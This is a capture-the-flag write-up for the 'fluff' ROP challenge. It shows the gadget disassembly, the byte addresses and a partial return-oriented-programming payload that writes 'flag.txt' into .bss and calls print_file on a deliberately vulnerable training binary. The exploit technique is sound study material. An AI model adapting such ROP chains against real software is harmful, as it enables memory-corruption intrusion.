# fluff
Almost same as problem write4, there is a function print_file in libfluff.so, we only need set the filename such as "flag.txt" into argument, nad call the function. But the only difference is that there is no suitable gadget in fluff binary. One way is to use the gadget in libfluff.so, and another way according to the hint is to use gadget in function questionableGadgets.

Check the binary security:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
PIE is disabled, then write data into data section is possible.

Check the function questionableGadgets:
```
0x0000000000400628 <+0>:	xlat   BYTE PTR ds:[rbx]
0x0000000000400629 <+1>:	ret    
0x000000000040062a <+2>:	pop    rdx
0x000000000040062b <+3>:	pop    rcx
0x000000000040062c <+4>:	add    rcx,0x3ef2
0x0000000000400633 <+11>:	bextr  rbx,rcx,rdx
0x0000000000400638 <+16>:	ret    
0x0000000000400639 <+17>:	stos   BYTE PTR es:[rdi],al
0x000000000040063a <+18>:	ret    
0x000000000040063b <+19>:	nop    DWORD PTR [rax+rax*1+0x0]
```
There are three gadgets in the function. Read the instructions individually. The instructions bextr, xlat and stos can be combined to write data into memory location.
```
...
0x000000000040062a <+2>:        pop    rdx
0x000000000040062b <+3>:        pop    rcx
0x000000000040062c <+4>:        add    rcx,0x3ef2
0x0000000000400633 <+11>:       bextr  rbx,rcx,rdx
0x0000000000400638 <+16>:       ret
# bextr will use rdx as control value, the low half bits are used as index, and high half bits are used as length, these index and length decide the substring copied from rcx, and then copy to rbx, which means that we can use rcx, rdx to control rbx.
...
```
```
...
0x0000000000400628 <+0>:        xlat   BYTE PTR ds:[rbx]
0x0000000000400629 <+1>:        ret
# xlat will set value in memory location [rbx+al] to al.
...
```
```
...
0x0000000000400639 <+17>:       stos   BYTE PTR es:[rdi],al
0x000000000040063a <+18>:       ret
# stos will stor al value into memory location [rdi].
...
```
Using these three gadgets, we can first control rbx value, and use rbx to set value we want to register al, and then store the al value into memory, since rdx is easily controled.

We also find some useful gadgets in binary:
```
...
0x0000000000400610 : mov eax, 0 ; pop rbp ; ret (gadget2) # reset rax(al) value
...
0x00000000004006a3 : pop rdi ; ret (gadget1) # control rdi register
...
```
Since stos instruction can only store one byte to memory, we need to move byte "flag.txt" inividually, and since rbx is used as address, we need to find a memory address, which value is 'f', or 'l'...

We find address with "flag.txt" in binary using ghidra:
```
f = 0x4005f6
l = 0x4003c1
a = 0x4003d6
g = 0x4003cf
dot = 0x40024e # '.'
t = 0x4003f1
x = 0x400246
```
We can build payload:
```
payload = 'A'*40 
payload += p64(bextr) + p64(0x20002000) + p64(f-0x3ef2)
# pop rdx value for index, and length, and pop rcx, subtract 0x3ef2 since rxc will add 0x3df2 afterward.
payload += p64(gadget2) + p64(0x0)
# reset rax(al) value
payload += p64(xlat) + p64(gadget1) + p64(bss) + p64(stos)
# xlat and set rdi value and stos the al to [rdi].
```
```
payload += p64(bextr+1) + p64(l-0x3ef2-ord('f')) + p64(xlat) + p64(gadget1) + p64(bss+1) + p64(stos)
# since rdx remain same, we set bextr gadget from pop rcx to reduce payload size, and also the al value can be reset by substracting value before, in order to reduce payload size.  
```
Same pattern for every byte in "flag.txt".
```
payload += p64(gadget1) + p64(bss) + p64(print_file)
# set "flag.txt" address in bss into rdi, and jump to print_file function.
```
Run the exploit.py, obtain the flag:
```
ROPE{a_placeholder_32byte_flag!}
```
